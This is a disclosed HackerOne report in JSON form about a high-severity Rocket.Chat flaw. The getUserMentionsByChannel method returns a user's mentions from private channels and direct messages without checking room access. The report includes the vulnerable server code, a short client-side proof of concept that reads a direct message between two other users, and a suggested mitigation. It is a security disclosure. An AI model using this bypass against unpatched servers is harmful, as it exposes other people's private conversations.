{
  "id": 1410246,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDEwMjQ2",
  "url": "https://hackerone.com/reports/1410246",
  "title": "getUserMentionsByChannel leaks messages with mention from private channel",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2021-11-25T15:00:53.635Z",
  "submitted_at": "2021-11-25T15:00:53.724Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "gronke",
    "url": "/gronke",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 19858,
    "url": "https://hackerone.com/rocket_chat",
    "handle": "rocket_chat",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/858/ada6c92a338715afad123af214dd6e22fd8dc6ff_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Rocket.Chat",
      "twitter_handle": "RocketChat",
      "website": "https://rocket.chat",
      "about": "Rocket.Chat is a company built on open source values and a love for efficiency. The company is driven by our amazing community of contributors."
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": true,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "no-content",
  "cve_ids": [
    "CVE-2022-35249",
    "CVE-2022-32220"
  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2022-09-22T16:01:13.414Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2022-09-22T12:02:08.461Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "",
  "weakness": {
    "id": 18,
    "name": "Information Disclosure"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2022-10-22T12:02:08.576Z",
  "allow_singular_disclosure_after": -91967905.6537159,
  "singular_disclosure_allowed": true,
  "vote_count": 3,
  "voters": [
    "defenderwww",
    "shreyaschavhan",
    "shivammusic"
  ],
  "severity": {
    "rating": "high",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "id": 194875,
      "category": "team",
      "content": "## Summary\n\nThe `getUserMentionsByChannel` meteor server method discloses messages from private channels and direct messages regardless of the users access permission to the room.\n\n## Description\n\nWhen calling the `getUserMentionsByChannel` method, the server does not check the users access to the given room and returns all messages the user has been mentioned in.\n\n```javascript\nMeteor.call(\n  \"getUserMentionsByChannel\",\n  { roomId: \"<TARGET_ROOM>\" },\n  console.log\n);\n```\n\nThe issue was found in [app/mentions/server/methods/getUserMentionsByChannel.js#L7-L23](https://github.com/RocketChat/Rocket.Chat/blob/194a600f31a1037716ac4de297cfff0b8a4f9942/app/mentions/server/methods/getUserMentionsByChannel.js#L7-L23) where roomId is verified to be a String only.\n\n```javascript\nMeteor.methods({\n\tgetUserMentionsByChannel({ roomId, options }) {\n\t\tcheck(roomId, String);\n\n\t\tif (!Meteor.userId()) {\n\t\t\tthrow new Meteor.Error('error-invalid-user', 'Invalid user', { method: 'getUserMentionsByChannel' });\n\t\t}\n\n\t\tconst room = Rooms.findOneById(roomId);\n\n\t\tif (!room) {\n\t\t\tthrow new Meteor.Error('error-invalid-room', 'Invalid room', { method: 'getUserMentionsByChannel' });\n\t\t}\n\n\t\tconst user = Users.findOneById(Meteor.userId());\n\n\t\treturn Messages.findVisibleByMentionAndRoomId(user.username, roomId, options).fetch();\n\t},\n});\n```\n\nThe server will return all messages the requesting user has been @ mentioned in.\n\n## Releases Affected:\n\n  * `4.1.2`\n  * `3.18.3`\n  * First [99065f7518bc88341210c0e38678bc3c97e3b58a](https://github.com/RocketChat/Rocket.Chat/blob/99065f7518bc88341210c0e38678bc3c97e3b58a/packages/rocketchat-mentions/server/methods/getUserMentionsByChannel.js) (12.03.2018)\n\n## Steps To Reproduce (from initial installation to vulnerability):\n\n1. Login to Rocket.Chat\n2. Obtain Room Id\n   1. Guess Direct Message roomId from User IDs\n   2. Leak private Message ID with unknown vulnerability\n3. Call `getUserMentionsByChannel` with given `{ roomId: \"<Value>\" }`\n4. Read messages where the own user was mentioned in console.log output\n\n## Supporting Material/References:\n\nThe following example leks a private message between two users to a third account `trudy` who performs the requests from the authenticated client disclosing a direct message between `alice` and `bob`.\n\n```javascript\nMeteor.user().username\n// > 'trudy'\nlet alice = 'kYfzDMQLyPFjS9ASb';\nlet bob = 'zZnrfd2RvcWhspr6S';\nMeteor.call(\n  \"getUserMentionsByChannel\",\n  { roomId: `${alice}${bob} }, // direct message channel\n  (err, data) => console.log(\n  \tdata\n  \t  .map((m) => `${m._id} ${m.u.username} (${m.ts.toGMTString()}): ${m.msg}`)\n  \t  .join(\"\\n\")\n  )\n);\n// > Yp6NoMZk34mnQZiBR alice (Thu, 25 Nov 2021 14:17:25 UTC): Mention @trudy somewhere\n\nMeteor.call(\"getMessages\", [\"Yp6NoMZk34mnQZiBR\"], (err, data) => console.log(err.message))\n// > Not allowed [error-not-allowed]\n```\n\n## Suggested mitigation\n\n  * Check for permission to read messages from the room given in in `{ roomId }` method argument.\n\n## Impact\n\nAuthenticated users can disclose all messages they were mentioned in from private channels and direct messages they should not have access to.\n\n\n## Fixed in\n\nWe have fix this issue in version 5.0>",
      "updated_at": "2022-09-22T12:01:41.319Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 1989106,
        "username": "mrd0d",
        "name": "Offsec team engineer",
        "bio": "",
        "cleared": false,
        "verified": false,
        "website": null,
        "location": "",
        "created_at": "2021-09-27T20:52:41.370Z",
        "url": "https://hackerone.com/mrd0d",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/j9d22b8d3wdw2lskn3dviwszwnze/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67?response-content-disposition=inline%3B%20filename%3D%22Ghost%20Boy.jpeg%22%3B%20filename%2A%3DUTF-8%27%27Ghost%2520Boy.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5NKBGNPG%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T224034Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHwaCXVzLXdlc3QtMiJIMEYCIQCuiv1sL3clKV5Gq9ovlpN4lUpxfXVRPO5S7i4GB9jbOAIhAJhj9iHM%2BKxo%2BwqjD52OqS5L1QVFFvytylHXEx3626jNKrsFCPX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgzQrC13HVAwal6Y9zIqjwWClsed%2FyfMcyuZpEMZ%2F7iisnIDqMlYnha7o9Hn6NSDNcq83Fg%2FpuaEzArEsNdyTehGWqNxr9lMLaZ42PeANCRAjPl9CE%2BBPQiHQFNSLMoV0LvM4WkAY%2Ffq2MhVU5r89KsNGOsccZdMkkSuxm2CRMQZ%2FdmZ2THcWa3%2BKsPtCFXjUAhYkVsRkfQL%2BHNRepdaaKwRn0HTE%2Bao4KHog4pM75yJrzAhO%2FlOZhm%2FIlQZ19BjlK4yhSiQLVYTBEUpEFksI6uzN3RIN%2FY02rRBNfjXiCaB3hgBwImnHBwnMCsvJQqBaujmBGM1VFrw3Q02bEsuHBG2zDa2t138qI%2FiQv33jfAWGPQMtjmVg5gBy9mrxW26qmFIk6AOkcB%2B12xyYVVRU5MtJTMKeGAsBOVRrCTXqTTzRl7ya4Q%2Ft%2FbgStVKzPmQYebiEN%2FH0qIIlpIw0JKetSuXHlRRpDCOgVDZFy5kARyD76eR2Az1T8x4Xkof6vJXrhbukgoMO4Yv9%2FMUNowkw7M1MhiGZUOjGVHPYNlzznFaoYAdFXks7OdooTmkFbJsfR81bqlxyJa1euR8OPgKgBUpHy39pj7zWHbjZak%2FfW8PmXgQhWsAFkZKbbKe3dXYS1mQjdOzmS3mIwGBowm1UIZ0ihhZ314Ysq2x7cjpZYC0ifUG1Dz8yh9ONEjthWZNZc5dM8oDk7%2Bd6dwt3ql3zWcU1ZrZsgUsffqHRfwFrUiCpWMxZfvugUE0Vw1Q7%2BmPvPEfdcY5khSyDS8NDEggotyYiRlh9Pa7H1nDQZe2G22KdRvX%2FJOwo%2F2Afuipn7w8RB%2FJ8ll1YbFAbwAJS3edkNYqad6OfiBy2%2BkLBhdSBlpf1NYmWjqYnTZRrMxRiEQLMNqDvMYGOrABy3gkT5lltr5PhQyeWCh5z7fK1pbNoMVtD7EW%2FQC4rVx3QyQfrsYYnqQoiLlMujEYC4eHimR0GskI0KX3Ny0vZj0DjevDyeqhFrJvS60QfPmZ6zacg%2BcZnomBVoBmEw4Nkt%2FYJATEGydLf9kvgtcU9YllLzwdUFu3hKfHAD5cY7knVbOF3UJ4ZF0Xl3nylxstgEl8FuU5DUgSfVssx9T0aBbDl8Llg2oLicN%2FpaoIPxY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=50adfcba083127e79521f614bb6ecb73c0d8bf89c145d2775cae84ac26087a1b",
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/j9d22b8d3wdw2lskn3dviwszwnze/74790fe75ac5dbe8a5140a122388d59ebac913dcfa941f0b3a45e6cad161f9ea?response-content-disposition=inline%3B%20filename%3D%22Ghost%20Boy.jpeg%22%3B%20filename%2A%3DUTF-8%27%27Ghost%2520Boy.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5NKBGNPG%2F20250920%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250920T224034Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHwaCXVzLXdlc3QtMiJIMEYCIQCuiv1sL3clKV5Gq9ovlpN4lUpxfXVRPO5S7i4GB9jbOAIhAJhj9iHM%2BKxo%2BwqjD52OqS5L1QVFFvytylHXEx3626jNKrsFCPX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgzQrC13HVAwal6Y9zIqjwWClsed%2FyfMcyuZpEMZ%2F7iisnIDqMlYnha7o9Hn6NSDNcq83Fg%2FpuaEzArEsNdyTehGWqNxr9lMLaZ42PeANCRAjPl9CE%2BBPQiHQFNSLMoV0LvM4WkAY%2Ffq2MhVU5r89KsNGOsccZdMkkSuxm2CRMQZ%2FdmZ2THcWa3%2BKsPtCFXjUAhYkVsRkfQL%2BHNRepdaaKwRn0HTE%2Bao4KHog4pM75yJrzAhO%2FlOZhm%2FIlQZ19BjlK4yhSiQLVYTBEUpEFksI6uzN3RIN%2FY02rRBNfjXiCaB3hgBwImnHBwnMCsvJQqBaujmBGM1VFrw3Q02bEsuHBG2zDa2t138qI%2FiQv33jfAWGPQMtjmVg5gBy9mrxW26qmFIk6AOkcB%2B12xyYVVRU5MtJTMKeGAsBOVRrCTXqTTzRl7ya4Q%2Ft%2FbgStVKzPmQYebiEN%2FH0qIIlpIw0JKetSuXHlRRpDCOgVDZFy5kARyD76eR2Az1T8x4Xkof6vJXrhbukgoMO4Yv9%2FMUNowkw7M1MhiGZUOjGVHPYNlzznFaoYAdFXks7OdooTmkFbJsfR81bqlxyJa1euR8OPgKgBUpHy39pj7zWHbjZak%2FfW8PmXgQhWsAFkZKbbKe3dXYS1mQjdOzmS3mIwGBowm1UIZ0ihhZ314Ysq2x7cjpZYC0ifUG1Dz8yh9ONEjthWZNZc5dM8oDk7%2Bd6dwt3ql3zWcU1ZrZsgUsffqHRfwFrUiCpWMxZfvugUE0Vw1Q7%2BmPvPEfdcY5khSyDS8NDEggotyYiRlh9Pa7H1nDQZe2G22KdRvX%2FJOwo%2F2Afuipn7w8RB%2FJ8ll1YbFAbwAJS3edkNYqad6OfiBy2%2BkLBhdSBlpf1NYmWjqYnTZRrMxRiEQLMNqDvMYGOrABy3gkT5lltr5PhQyeWCh5z7fK1pbNoMVtD7EW%2FQC4rVx3QyQfrsYYnqQoiLlMujEYC4eHimR0GskI0KX3Ny0vZj0DjevDyeqhFrJvS60QfPmZ6zacg%2BcZnomBVoBmEw4Nkt%2FYJATEGydLf9kvgtcU9YllLzwdUFu3hKfHAD5cY7knVbOF3UJ4ZF0Xl3nylxstgEl8FuU5DUgSfVssx9T0aBbDl8Llg2oLicN%2FpaoIPxY%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8a8317cc4fef5003740523e7b3c1a5c907d627e57137701755d7ca02125cc573",
          "xtralarge": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6MTcwOTk1NSwicHVyIjoiYmxvYl9pZCJ9fQ==--be5e56ef7524606adf37a742155f3190b1c2c329/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJqcGVnIiwicmVzaXplIjoiMjYweDI2MFx1MDAzZSJ9LCJwdXIiOiJ2YXJpYXRpb24ifX0=--cea846659d6dfdc215f3c0fb14f7ed8ebc9f95ef/Ghost%20Boy.jpeg"
        }
      }
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
